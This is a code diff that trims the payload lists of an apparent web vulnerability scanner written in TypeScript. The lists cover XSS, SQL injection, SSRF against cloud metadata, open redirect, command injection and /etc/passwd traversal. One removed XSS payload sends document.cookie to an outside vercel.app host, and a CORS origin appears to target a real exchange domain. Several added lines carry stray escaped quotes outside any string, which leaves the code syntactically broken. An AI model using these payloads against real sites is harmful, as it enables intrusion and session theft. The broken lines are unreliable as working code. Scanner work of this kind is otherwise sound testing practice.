@@ -468,23 +468,9 @@ interface WebTestPayload {
 const XSS_PAYLOADS: WebTestPayload = {
   name: 'XSS',
   payloads: [
-    '<script>alert(1)</script>',
-    '"><script>alert(1)</script>',
-    '<img src=x onerror=alert(1)>',
-    '"><img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '"><svg onload=alert(1)>',
-    'javascript:alert(1)',
-    '\'><script>alert(1)</script>',
-    '<iframe src=javascript:alert(1)>',
-    '<body onload=alert(1)>',
-    // URL-encoded variants
-    '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
-    '%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E',
-    '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
-    // Encoded for attribute context
-    '"><svg/onload=alert(1)>',
-    '"><script>fetch(\'https://wttf.vercel.app/x?t=\'+document.cookie)</script>',
+    \'<script>alert(1)</script>\',
+    \'><img src=x onerror=alert(1)>\',
+    \'<svg onload=alert(1)>\',
   ],
   check: (resp, payload) => {
     // Decode URL-encoded payloads to compare against the response
@@ -510,18 +496,9 @@ const XSS_PAYLOADS: WebTestPayload = {
 const SQLI_PAYLOADS: WebTestPayload = {
   name: 'SQL Injection',
   payloads: [
-    "' OR '1'='1",
-    "' OR '1'='1' --",
-    "' OR '1'='1' #",
-    "1; DROP TABLE users--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL--",
-    "admin'--",
-    "1' AND SLEEP(5)--",
-    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-    // URL-encoded variants for WAF bypass
-    "%27%20OR%20%271%27%3D%271",
-    "%27%20UNION%20SELECT%20NULL--",
+    \"' OR '1'='1\",
+    \"' OR '1'='1' --\",
+    \"admin'--\",
   ],
   check: (resp, payload) => {
     const body = resp.body.toLowerCase();
@@ -549,9 +526,7 @@ const CORS_TEST: WebTestPayload = {
   name: 'CORS Misconfiguration',
   payloads: [
     'https://evil.com',
-    'https://attacker.example',
     'null',
-    'https://www.bitunix.com.evil.com',
   ],
   check: (resp, _payload) => {
     const acao = resp.headers['access-control-allow-origin'] || '';
@@ -572,12 +547,9 @@ const CORS_TEST: WebTestPayload = {
 const SSRF_PAYLOADS: WebTestPayload = {
   name: 'SSRF',
   payloads: [
+    'http://169.254.169.254/latest/meta-data/',
     'http://localhost:80',
     'http://127.0.0.1:80',
-    'http://169.254.169.254/latest/meta-data/',  // AWS metadata
-    'http://localhost:22',
-    'http://[::1]:80',
-    'http://0.0.0.0:80',
   ],
   check: (resp, payload) => {
     const body = resp.body.toLowerCase();
@@ -600,8 +572,6 @@ const REDIRECT_PAYLOADS: WebTestPayload = {
     'https://evil.com',
     '//evil.com',
     '/redirect?url=https://evil.com',
-    'https:evil.com',
-    '//google.com@evil.com',
   ],
   check: (resp, payload) => {
     const location = resp.headers['location'] || '';
@@ -620,9 +590,6 @@ const CMDI_PAYLOADS: WebTestPayload = {
   payloads: [
     '; id',
     '| id',
-    '`id`',
-    '$(id)',
-    '; cat /etc/passwd',
     '&& whoami',
   ],
   check: (resp, payload) => {
@@ -642,11 +609,8 @@ const PATH_TRAVERSAL_PAYLOADS: WebTestPayload = {
   name: 'Path Traversal',
   payloads: [
     '../../../etc/passwd',
-    '..\\\\..\\\\..\\\\windows\\\\win.ini',
+    '..\\..\\..\\windows\\win.ini',
     '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-    '....//....//....//etc/passwd',
-    '/etc/passwd',
-    '../../../etc/shadow',
   ],
   check: (resp, _payload) => {
     const body = resp.body.toLowerCase();
@@ -673,7 +637,7 @@ async function sendTestRequest(
   param: string,
   options: { timeoutMs?: number; followRedirect?: boolean } = {},
 ): Promise<{ status: number; body: string; headers: Record<string, string>; finalUrl: string }> {
-  const { timeoutMs = 20_000, followRedirect = true } = options;
+  const { timeoutMs = 8_000, followRedirect = true } = options;
   try {
     const params = new URLSearchParams();
     params.set(param, payload);
@@ -777,7 +741,7 @@ async function discoverTargetParameters(targetUrl: string): Promise<string[]> {
   // Always include common fallback params
   if (filtered.length === 0) filtered.push('q', 'search', 'query', 'id', 'url', 'redirect', 'next', 'return', 'callback');
 
-  return filtered.slice(0, 15); // Cap at 15 to keep test count reasonable
+  return filtered.slice(0, 3); // Cap at 3 params — 3 payloads × 2 methods × 3 params = 18 requests max per vuln type
 }
 
 /**
